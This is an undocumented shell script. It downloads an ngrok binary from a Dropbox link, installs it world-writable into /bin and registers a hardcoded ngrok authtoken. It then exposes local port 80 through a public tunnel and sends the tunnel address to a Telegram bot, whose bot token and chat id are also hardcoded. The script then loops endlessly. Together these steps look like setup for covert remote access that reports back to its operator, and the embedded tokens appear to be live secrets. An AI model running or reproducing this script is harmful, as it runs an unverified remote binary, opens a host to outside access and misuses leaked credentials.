apt update -y
yum update -y
apk update -y
apt install jq bash curl wget -y     
yum install jq bash curl wget -y
apk add jq bash curl wget
 
wget  https://dl.dropboxusercontent.com/s/ne7fl0hk5fcpqu9/ngrok
chmod 777 ngrok
mv ngrok /bin/ngrok
ngrok authtoken 1YsWVYXWbkqPGLdUYWWMmhFyYox_7xSvN78fbJW8WUydzXAR2
killall ngrok
ngrok http 80 > /dev/null &
sleep 3
export WEBHOOK_URL="$(curl -s http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url")"
sleep 2

 
while true
do
  i=$( curl -s http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url" | grep https )
  if [ -z "$i" ]
  then
    touch tmp
    echo try
  else

   export ngrok=$i

   i=$(echo $i | xargs)
curl -s "https://api.telegram.org/bot5234920052:AAEDxAVyUMHE5p_t1FwhC3HRUC9FycEz_Tc/sendMessage?chat_id=1395896130&text=server got new ip = $i"

  exit
  fi
  done


while true
do 
echo alive
sleep 2
done
